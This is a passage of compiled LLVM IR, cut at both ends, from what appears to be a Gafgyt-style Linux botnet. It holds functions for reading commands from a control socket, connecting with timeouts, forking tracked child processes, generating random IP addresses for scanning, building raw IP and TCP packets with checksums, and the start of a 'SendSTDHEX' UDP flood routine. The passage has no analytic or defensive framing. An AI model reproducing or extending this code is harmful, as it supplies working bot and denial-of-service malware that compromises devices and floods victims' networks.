  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %86

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %85

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %57, i64 0, i64 0
  %59 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %58) #5, !srcloc !3
  %60 = extractvalue { i64, i64* } %59, 0
  %61 = extractvalue { i64, i64* } %59, 1
  %62 = trunc i64 %60 to i32
  store i32 %62, i32* %14, align 4
  %63 = ptrtoint i64* %61 to i64
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %15, align 4
  br label %65

; <label>:65:                                     ; preds = %56
  %66 = load i32, i32* %5, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %71 = load i32, i32* %5, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %79, i32* %12, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %50

; <label>:84:                                     ; preds = %65
  br label %85

; <label>:85:                                     ; preds = %84, %50
  br label %86

; <label>:86:                                     ; preds = %85, %33
  store i32 0, i32* %18, align 4
  %87 = load i8*, i8** %6, align 8
  store i8* %87, i8** %17, align 8
  br label %88

; <label>:88:                                     ; preds = %106, %86
  %89 = load i32, i32* %7, align 4
  %90 = add nsw i32 %89, -1
  store i32 %90, i32* %7, align 4
  %91 = icmp sgt i32 %89, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i64 @recv(i32 %93, i8* %16, i64 1, i32 0)
  %95 = icmp ne i64 %94, 1
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %92
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  store i32 -1, i32* %4, align 4
  br label %112

; <label>:98:                                     ; preds = %92
  %99 = load i8, i8* %16, align 1
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %17, align 8
  store i8 %99, i8* %100, align 1
  %102 = load i8, i8* %16, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %18, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %18, align 4
  br label %88

; <label>:109:                                    ; preds = %105, %88
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  %111 = load i32, i32* %18, align 4
  store i32 %111, i32* %4, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %96
  %113 = load i32, i32* %4, align 4
  ret i32 %113
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #5, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #5
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #5
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #5
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTDHEX(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #5
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
